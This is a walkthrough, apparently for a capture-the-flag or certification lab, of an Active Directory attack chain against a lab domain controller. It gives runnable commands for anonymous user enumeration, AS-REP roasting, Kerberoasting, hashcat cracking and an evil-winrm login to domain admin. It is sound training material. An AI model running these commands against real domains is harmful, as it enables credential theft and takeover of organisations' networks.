# Scenario 13 — AS-REP Roast to Kerberoast to Domain Admin

**Difficulty:** 🔴 | **Time:** ~40 min | **Domains:** 03 Enumeration, 05 System Hacking, 18 Crypto
**Tools:** [nmap](../../tools/nmap.md), [impacket](../../tools/impacket.md), [crackmapexec](../../tools/crackmapexec.md), [hashcat](../../tools/hashcat.md), [evil-winrm](../../tools/evil-winrm.md)

## Story
Target `10.10.10.99` is a Windows DC for domain `corp.local`. Get Domain Admin.

## Step 1 — Scan
```bash
nmap -sV -p- -T4 10.10.10.99
```
**Expected finding:** 53, 88 (Kerberos), 135, 139, 389, 445, 464, 636, 3268, 5985 (WinRM).

## Step 2 — Userlist from RPC / LDAP
```bash
impacket-lookupsid anonymous@10.10.10.99 | grep SidTypeUser | awk '{print $2}' | cut -d'\' -f2 > users.txt
# or via LDAP anon:
ldapsearch -x -H ldap://10.10.10.99 -b 'DC=corp,DC=local' '(objectClass=user)' sAMAccountName
```
**Expected finding:** `users.txt` with accounts like `alice`, `bob`, `svc_sql`, `backupadmin`.

## Step 3 — AS-REP roast (users without preauth)
```bash
impacket-GetNPUsers corp.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.99
```
**Expected finding:** `$krb5asrep$23$alice@CORP.LOCAL:...` hash dumped.
**→ Tool ref:** [impacket-GetNPUsers](../../tools/impacket.md)

## Step 4 — Crack AS-REP hash
```bash
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
```
**Expected finding:** `alice : Spring2024!`.
**→ Tool ref:** [hashcat -m 18200](../../tools/hashcat.md)

## Step 5 — Validate + enum domain
```bash
crackmapexec smb 10.10.10.99 -u alice -p 'Spring2024!'
crackmapexec ldap 10.10.10.99 -u alice -p 'Spring2024!' --users
```
**→ Tool ref:** [crackmapexec](../../tools/crackmapexec.md)

## Step 6 — Kerberoast SPN accounts
```bash
impacket-GetUserSPNs corp.local/alice:'Spring2024!' -dc-ip 10.10.10.99 -request
```
**Expected finding:** `$krb5tgs$23$svc_sql$CORP.LOCAL$...` ticket.

## Step 7 — Crack the TGS
```bash
hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt
```
**Expected finding:** `svc_sql : Summer2024!`.

## Step 8 — If svc_sql is DA, WinRM in
```bash
evil-winrm -i 10.10.10.99 -u svc_sql -p 'Summer2024!'
whoami /groups
type C:\Users\Administrator\Desktop\root.txt
```
**→ Tool ref:** [evil-winrm](../../tools/evil-winrm.md)

## Step 9 — Final answer
**Answer format:** the flag from `root.txt` (or the cracked DA password).

## Gotchas across this chain
- AS-REP mode is `18200`, Kerberoast is `13100` — easy to swap and waste GPU hours.
- `-no-pass` on GetNPUsers is required or it'll prompt.
- Some users have `DONT_REQ_PREAUTH` set — only those return a hash. An empty result means the flag is elsewhere.
- Time skew breaks Kerberos: `sudo ntpdate 10.10.10.99` or `sudo rdate -n 10.10.10.99` first.
- `crackmapexec` = pass-the-auth validator; use it to confirm creds before pivoting.

## Variant questions this scenario teaches you to handle
- "Dump domain users anonymously" → step 2.
- "Perform an AS-REP roast" → step 3.
- "Crack this $krb5asrep hash" → step 4.
- "Kerberoast the domain" → step 6.
- "Get DA on corp.local" → full chain.
